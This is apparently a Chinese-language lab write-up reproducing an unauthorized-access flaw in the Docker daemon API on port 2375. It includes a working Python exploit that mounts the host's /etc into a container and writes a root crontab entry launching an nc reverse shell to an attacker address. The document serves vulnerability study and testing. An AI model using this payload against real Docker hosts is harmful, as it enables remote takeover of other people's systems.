# docker daemon api 未授权访问漏洞

参考链接：

- http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8

## 漏洞环境

编译及启动漏洞环境：

```
docker-compose build
docker-compose up -d
```

环境启动后，将监听2375端口。

## 漏洞复现

利用方法是，我们随意启动一个容器，并将宿主机的`/etc`目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

写入crontab文件，成功反弹shell：

![](1.png)

**PS.** 注意，这里的 payload 影响到的是宿主机的 `/etc/` 目录，执行反弹shell的动作也是来自于宿主机，则 payload 中所执行的命令会受到宿主机操作系统及环境的差异带来影响，例如： [Issue #66](https://github.com/vulhub/vulhub/issues/66) 中， 操作系统的中 nc 属于 OpenBSD 分支，`-e` 参数存在差异（[见文档](http://man.openbsd.org/nc)），所以 `/usr/bin/nc your-ip 21 -e /bin/sh` 这个payload是无法正常执行的，请自行修改。
